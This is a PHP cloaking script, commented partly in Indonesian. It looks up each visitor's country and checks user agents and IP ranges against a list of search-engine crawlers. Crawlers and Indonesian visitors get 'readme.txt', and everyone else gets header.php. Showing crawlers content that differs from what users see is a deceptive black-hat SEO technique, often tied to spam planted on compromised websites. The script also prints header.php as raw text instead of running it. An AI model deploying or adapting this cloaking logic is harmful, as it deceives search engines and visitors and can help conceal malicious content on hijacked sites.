<?php
// Deteksi IP pengunjung
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);
$is_bot = false;

/* ---------- FIXED: robust client IP + geo lookup ---------- */

// Prefer real client IP if behind Cloudflare / proxy
function getClientIp(): string {
    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // take first IP in the list
        $parts = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($parts[0]);
    } else {
        $ip = $_SERVER['REMOTE_ADDR'] ?? '';
    }
    return filter_var($ip, FILTER_VALIDATE_IP) ? $ip : '0.0.0.0';
}

function http_get_json($url, $timeout = 2.0) {
    // Try file_get_contents first (if allow_url_fopen is enabled)
    $ctx = stream_context_create([
        'http' => [
            'timeout' => $timeout,
            'ignore_errors' => true,
            'header' => "Accept: application/json\r\nUser-Agent: geo-check/1.0\r\n"
        ],
        'ssl' => [
            'verify_peer' => true,
            'verify_peer_name' => true,
        ],
    ]);
    $json = @file_get_contents($url, false, $ctx);
    if ($json !== false && $json !== '') return $json;

    // Fallback to cURL
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_CONNECTTIMEOUT => $timeout,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_HTTPHEADER => ['Accept: application/json','User-Agent: geo-check/1.0'],
        ]);
        $json = curl_exec($ch);
        curl_close($ch);
        if ($json !== false && $json !== '') return $json;
    }
    return null;
}

function getCountryCode(string $ip): ?string {
    // Try a couple of HTTPS providers
    $endpoints = [
        "https://ipapi.co/{$ip}/json/",
        "https://ipinfo.io/{$ip}/json",
    ];
    foreach ($endpoints as $url) {
        $raw = http_get_json($url, 2.0);
        if (!$raw) continue;
        $data = json_decode($raw, true);
        if (!is_array($data)) continue;

        // normalize common fields to 2-letter uppercase
        if (!empty($data['country_code'])) return strtoupper($data['country_code']);
        if (!empty($data['country']))      return strtoupper($data['country']);
        if (!empty($data['countryCode']))  return strtoupper($data['countryCode']);
    }
    return null;
}

// Use the real client IP
$clientIp = getClientIp();
$country  = getCountryCode($clientIp);

// If Indonesia (ID)
if ($country === 'ID') {
    header('HTTP/1.1 200 OK');
    echo file_get_contents('readme.txt');
    exit;
}
/* ---------- END FIXED GEO BLOCK ---------- */

// …your existing bot detection and serve logic stays exactly the same…

// Daftar bot yang biasa mengakses situs
$bots = array(
    'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
    'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver', 'mj12bot'
);

// Range IP bot yang umum
$bot_ips = array('66.249.', '157.55.', '40.77.', '17.58.');

// Cek apakah bot berdasarkan user agent
$is_bot = false;
foreach ($bots as $bot) {
    if (strpos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

// Cek apakah IP berasal dari bot
foreach ($bot_ips as $bot_ip) {
    if (strpos($ip, $bot_ip) === 0) {
        $is_bot = true;
        break;
    }
}

// Tentukan file yang akan dimuat
if ($is_bot) {
    $content = file_get_contents('readme.txt');
    header('HTTP/1.1 200 OK');
    echo $content;
    exit;
} else {
    $content = file_get_contents('header.php');
    header('HTTP/1.1 200 OK');
    echo $content;
}
